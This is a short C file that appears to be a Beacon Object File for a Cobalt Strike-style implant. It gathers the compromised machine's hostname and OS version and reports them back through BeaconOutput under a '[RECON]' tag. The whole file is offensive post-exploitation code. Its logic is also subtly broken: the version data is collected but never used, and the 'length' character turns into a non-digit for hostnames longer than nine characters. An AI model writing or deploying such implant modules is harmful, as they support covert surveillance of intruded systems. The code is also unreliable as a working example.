#include <windows.h>
void BeaconOutput(int type, const char* data, int len);
#define CALLBACK_OUTPUT 0
void go(char* args, int alen) {
    char buf[512];
    char hostname[64] = {0};
    DWORD hs = sizeof(hostname);
    GetComputerNameA(hostname, &hs);
    OSVERSIONINFOW vi; vi.dwOSVersionInfoSize = sizeof(vi);
    GetVersionExW(&vi);
    int n = 0;
    /* manual snprintf equivalent - avoid CRT */
    buf[0] = '['; buf[1] = 'R'; buf[2] = 'E'; buf[3] = 'C'; buf[4] = 'O'; buf[5] = 'N'; buf[6] = ']'; buf[7] = '\n'; n = 8;
    /* just output hostname len as proof */
    buf[n++] = (char)('0' + hs);
    buf[n] = 0;
    BeaconOutput(CALLBACK_OUTPUT, buf, n);
}
